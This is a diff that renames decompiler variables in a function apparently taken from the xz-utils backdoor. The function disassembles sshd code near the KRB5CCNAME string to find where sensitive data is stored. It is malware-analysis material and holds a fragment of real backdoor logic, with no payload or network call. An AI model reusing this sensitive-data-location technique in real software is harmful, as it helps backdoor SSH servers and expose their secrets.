@@ -19,32 +19,32 @@ BOOL sshd_get_sensitive_data_address_via_krb5ccname
 
 {
   u8 dest_reg;
-  BOOL BVar2;
+  BOOL decode_ok;
   u8 *krb5_string_ref;
   u8 *candidate_store;
   uint probe_depth;
-  long lVar5;
+  long clear_idx;
   u8 rex_extension;
   u8 *data_cursor;
   u8 *store_scan_cursor;
-  dasm_ctx_t *pdVar9;
+  dasm_ctx_t *zero_ctx_cursor;
   u8 tracked_reg;
-  byte bVar11;
+  u8 zero_seed;
   dasm_ctx_t string_scan_ctx;
   dasm_ctx_t store_scan_ctx;
   
-  bVar11 = 0;
-  pdVar9 = &string_scan_ctx;
-  for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
-    *(undefined4 *)&pdVar9->instruction = 0;
-    pdVar9 = (dasm_ctx_t *)((long)&pdVar9->instruction + 4);
+  zero_seed = 0;
+  zero_ctx_cursor = &string_scan_ctx;
+  for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
+    *(undefined4 *)&zero_ctx_cursor->instruction = 0;
+    zero_ctx_cursor = (dasm_ctx_t *)((long)&zero_ctx_cursor->instruction + 4);
   }
   *sensitive_data_out = (void *)0x0;
   krb5_string_ref = elf_find_string_reference(elf,STR_KRB5CCNAME,code_start,code_end);
   if (krb5_string_ref != (u8 *)0x0) {
     while (krb5_string_ref < code_end) {
-      BVar2 = x86_dasm(&string_scan_ctx,krb5_string_ref,code_end);
-      if (BVar2 == FALSE) {
+      decode_ok = x86_dasm(&string_scan_ctx,krb5_string_ref,code_end);
+      if (decode_ok == FALSE) {
         krb5_string_ref = krb5_string_ref + 1;
       }
       else {
@@ -87,15 +87,15 @@ LAB_0010345d:
                 if (dest_reg != tracked_reg) goto LAB_001033d1;
               }
 LAB_0010346b:
-              pdVar9 = &store_scan_ctx;
-              for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
-                *(undefined4 *)&pdVar9->instruction = 0;
-                pdVar9 = (dasm_ctx_t *)((long)pdVar9 + (ulong)bVar11 * -8 + 4);
+              zero_ctx_cursor = &store_scan_ctx;
+              for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
+                *(undefined4 *)&zero_ctx_cursor->instruction = 0;
+                zero_ctx_cursor = (dasm_ctx_t *)((long)zero_ctx_cursor + (ulong)zero_seed * -8 + 4);
               }
               store_scan_cursor = string_scan_ctx.instruction + string_scan_ctx.instruction_size;
               probe_depth = 0;
               while (((store_scan_cursor < code_end && (probe_depth < 6)) &&
-                     (BVar2 = x86_dasm(&store_scan_ctx,store_scan_cursor,code_end), BVar2 != FALSE))) {
+                     (decode_ok = x86_dasm(&store_scan_ctx,store_scan_cursor,code_end), decode_ok != FALSE))) {
                 if (*(u32 *)&store_scan_ctx.opcode_window[3] == 0x109) {
                   if (((uint)store_scan_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
                     dest_reg = 0;
